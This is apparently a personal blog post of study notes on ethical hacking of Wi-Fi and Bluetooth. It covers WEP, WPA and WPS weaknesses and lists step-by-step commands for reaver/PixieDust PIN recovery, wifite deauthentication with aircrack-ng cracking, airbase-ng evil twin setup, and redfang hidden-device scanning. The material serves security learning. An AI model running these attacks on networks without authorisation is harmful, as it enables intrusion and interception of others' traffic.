---
draft: false
title: "Ethical Hacking - Wireless Networks - notes"
slug: "ethical-hacking-wireless-networks-notes"
date: "2018-05-14T19:35:30+01:00"
categories:
  - security
  - learning
tags:
  - notes
  - security
  - ethical hacking
  - pentesting
  - wifi
cover:
  image: /img/2018/004/ethical-hacking-wikimedia.jpg
  caption: "Source: [wikimedia.org](https://commons.wikimedia.org/wiki/File:Ethical-hacking.jpg)"
  style: normal
---


* Cain - wireless scanner, cracker etc.


# WEP

* build to prevent eavesdropping
* ensures integrity of transmitted data
* is a lightweight solution (does not require a lot of CPU power)
* is not very secure as it doesn't allow to distribute keys at scale
* uses weak encryption
* key recovery is possible through sniffing!!!
* uses 40-bit keys & 24-bit initialization vectors (IVs too small)
* frequently used poor implementations of random number generators
* prone to DoS attacks through use of `associate` & `disassociate` messages


# WPA

* Wi-Fi Protected Access (WPA) was introduced to replace `WEP`
* uses `TKIP` (Temporal Key Integrity Protocol) which changes the key for 
    every frame that is transmitted.
* supports `AES`


# WPA2

* introduced more security improvements
* AES is used by default
* WPA2 Personal - uses shared keys
* WPA2 Enterprise - supports RADIUS


# WPS - Wireless Protected Setup

* Uses Wi-Fi Simple Configuration (WSC) protocol
* vendors can submit devices for WPS Certification to Wi-Fi Alliance
* Allows for automatic exchange of keying information
* Client picks the network he wants to connect, when prompted for the passw
    then you press the `WPS` button on the router and devices automagically
    exhange the keys.
* `WPS` enabled devices should properly implement mandatory `WPS PIN` feature
    (which uses a randomly generated code in the router, which you should
    provide when connecting to it) but it's rarely used.
* `WSC Enrollments Process` - devices that wants to connect is called `enrolee`
    * `Enrollee` becomes a member when enrolled
    * `Registrar` has an authority to issue credentials and it can be
        integrated into the access point itself.
    * the registration process (enrolment) takes places in `2-minute window`
        called `the walk time`
    * the registration process can be initiated from the device or the access
        point (typically by pressing a button on the access point)
    * it can also be triggerred automatically in order to support
        auto-reconnect feature


**TODO**:
FIND pictures about WPS exchange (EAPOL) etc.


## Brute forcing the WPS PIN

* 8 digits long (stored as 2 sets of 4 digits)
* each set can be brute forced independently
* Eight digit is a checksum of the first seven
* Total combinations is `10⁴ + 10³ ≈ 11000` 
* If `WPS` is properly implemented then it should lock down after multiple 
    failed attempts and/or should introduce suggested 60-seconds delay after 
    three failed attempts. It's called `WPS rate limiting`


## Extracting WEP passwords

* can be done with `wified` & `air-crack`
* it uses attacks like:
    * `arp-replay`
    * `chop-chop`
    * fragmentations attacks
    * `caffe-latte` 
* once it succeeds it shows the key in hex


## Extracting network password via WPS

* will use tool called `reaver`:
* `airmon-ng start wlan0` - start the interface in monitoring mode
* `wash -i wlan0mon` - identify networks that use WPS and find it BSSID
* `reaver -i wlan0mon -b enter:target:BSSID -c 1 -vv`


## Cracking WPA password with WiFite & Aircrack NG

`wifite` checks for clients connected to target network, then de-authenticates 
those users, forcing them to re-authenticate. It then captures the handshake 
packets for further analysis with `aircrack ng`.

* `airmon-ng start wlan0` - start the interface in monitoring mode
* `wifite --mac --aircrack` - run `wifite` with random mac address, once
    handshake sequence is captured it saves it in `cap` file
* `aircrack-ng *.cap -w your_dictionary.txt` - try to decrypt the password with
    a dictionary


## Using PixieDust to recover WPS PIN

`PixieDust` needs only one handshare sequence from `WPS` negotiation, but it
works only if the WPS implementation uses low quality RNG which are quite
frently used by major router vendors. Sometimes the `nonce` used to generate
the WPS PIN is set to `0`!!!

* `airmon-ng start wlan0` - start the interface in monitoring mode
* `wash -i wlan0mon` - identify networks that use WPS and find it BSSID
* `reaver -i wlan0mon -b enter:target:BSSID -c 10 -K 1 -vv` - run `reaver` with
    `-K` to use `PixieDust` like method in order to decrypt the WPS PIN.
* once WPS PIN is recovered then `reaver` will recover `WPA PSK`


# Evil Twin

Is a hotspot that has the same `SSID`, `BSSID` as the target network and
works on the same channel but it has stronger signal. 
It might de-auth client from the legit network in order to force them to
connect to itself (and providing the key)


`Airbase ng` can be used to create an `evel twin` hotspot.

* `airmon-ng start wlan0` - start the interface in monitoring mode
* `airodump-ng wlan0mon` - list nearby access points and devices
* `airbase-ng -a target-BSSID --essid target-SSID -c 1 wlan0mon` - set adapter
    to `evil twin` mode.
    * from now on, our wifi adpater will work as `MITM` and re-route traffic to
        the legitimate AP.
* now we can use e.g. Wireshark to monitor the traffic with filters like:
    * `wlan.sa client-MAC == or wlan.ra == client.MAC`
    * we can see `802.11` packets with `WPA` encrypted traffic as `MITM`


`WiFi Pineapple` adapters can be used for creating rogue access points and
other forms of wifi hacking.


# Bluetooh


* Bluetooth operates in the 2.4GHz band
* it's defined in `IEEE 802.15.1` standard
* It can be used to create `Piconets` in one of two modes:
    * One server and one client
    * or up to seven active clients (clients can't talk to each other but to
        server)
* Bluetooth Device address is a 48-bit number
* formed as xx:xx:xx:yy:yy:yy
* wheew `xx:xx:xx` is the fixed Vendor ID (Organisation Unique ID [UOI])
* and `yy:yy:yy` is the unique device ID
* device also has a friendly name
* there are various classes of BT devices:
    * `Class 1` - up to 100m range
    * `Class 2` - up to 10m range
    * `Class 3` - up to 10cm range
* Bluetooth can transmit real-time streams audio and video or transfer files
* Bluetooth scanning is called an `inquiry`
* Device can automatically bond when they were previously paired
* Pairing - may require confiriming 6-digit number
* Bluetooth can operated in one or more profiles:
    * `SPP` - Serial Port Profile
    * `HID` - Human Interface Device Profile
    * `HFP` - Hands-free Profile
    * `A2DP` - Advanced Audio Distribution Profile
    * `AVRCP` - Audio/Video Remote Control Profile
    * `SDP` - Service Discovery Protocol allows BT devices to identify sercices
        offered by other devices, especially the profiles of it. `SDP` offers
        direct support for searching for specific SSIDs and for browsing
        services.


## Bluetooth stack


```text
⌜⎺⎺⎺⎺⎺⎺⌝ ⌜⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⌝
⎸     ⎹ ⎸          Applications                  ⎹ 
⎸     ⎹ ⌞_________________________________________⌟
⎸     ⎹ ⌜⎺⎺⎺⎺⎺⎺⎺⎺⌝ ⌜⎺⎺⎺⎺⎺⎺⎺⌝ ⌜⎺⎺⎺⎺⎺⎺⎺⎺⌝  ⌜⎺⎺⎺⎺⎺⎺⎺⎺⌝
⎸     ⎹ ⎸ TCP/IP⎹ ⎸ HCI  ⎹ ⎸ RFCOMM⎹  ⎸       ⎹
⎸     ⎹ ⌞________⌟ ⌞_______⌟ ⌞________⌟  ⎸       ⎹
⎸     ⎹ ⌜⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⌝ ⎸       ⎹
⎸Audio⎹ ⎸          DATA               ⎹ ⎸Control⎹
⎸     ⎹ ⌞______________________________⌟ ⎸       ⎹
⎸     ⎹ ⌜⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⌝ ⎸       ⎹
⎸     ⎹ ⎸         L2CAP               ⎹ ⎸       ⎹
⎸     ⎹ ⌞______________________________⌟ ⌞________⌟
⎸     ⎹ ⌜⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⌝
⎸     ⎹ ⎸      Link Manager                      ⎹ 
⌞______⌟ ⌞_________________________________________⌟
⌜⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⌝
⎸                  Driver                         ⎹ 
⌞__________________________________________________⌟
⌜⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⌝
⎸                 Baseband                        ⎹ 
⌞__________________________________________________⌟
⌜⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⌝
⎸                  Radio                          ⎹ 
⌞__________________________________________________⌟
```


## Bluetooh tools

* `hciconfig` - display bluetooth interface
* `hcitool scan --info --oui` → scan for bluetooth devices
    * `--info` enumerates the device
    * `--oui` tells the type of the device
* `bluelog -l` → another tool to discover bluetooth devices
* `btscanner` → -||-
* `l2ping device:MAC` - checks if device is active (visible to other devices)
    * if device is active it will response like with reugular `ping` command
    * if the device is set not to be visible to other devices then l2ping won't
        be able to find it.
* `redfang` allows for brute-force search of bluetooth device which are active
    but set not to be visible to other devices.
    * `fang -s -r 0CD6BD46400-0CD6BD464FF` → scan selected bluetooth device range
    * scanning the whole device range can take a lof of time
    * to shorten the discovery time we can find scan for the device's wifi MAC
        address as it's frequently close to the bluetooth device ID.
    * so first scan for wifi devices:
    * `airmon-ng start wlan0` - start the interface in monitoring mode
    * `airodump-ng wlan0mon` - list nearby devices
    * once we have the device mac address, then we can use it as the starting
        point for scanning for hidden bluetooth devices with `redfang`


# Other tools

* `Fern Wifi Cracker` - it's basically a GUI for aircrack-ng
* `inSSIDer 4` - a shareware wifi scanner (there are free android apps that are
    better than it)
* `ACRYLIC WiFi analyser` - pretty advanced wifi scanner with options like:
    * wifi coverage heatmap
    * brute force passwords with the use of a dictionary
    * packet capturing
    * scripting features for WPS PIN recovery etc.
    * it seems to be a great tool for people frequently working with wifi 
        security testing.
    * works with some IoT devices
* [akahau](www.ekahau.com) - wifi heatmapper
* [ViStumbler](https://github.com/RIEI/Vistumbler) - windows wifi scanner which
    integrates with gps signal. so we can map wifis to locations
* [Vistumbler WiFiDB](https://live.wifidb.net) - a DB of WiFi with GPS coords.
* [CommView for WiFi](www.tamos.com) - advanced wifi monitoring tool

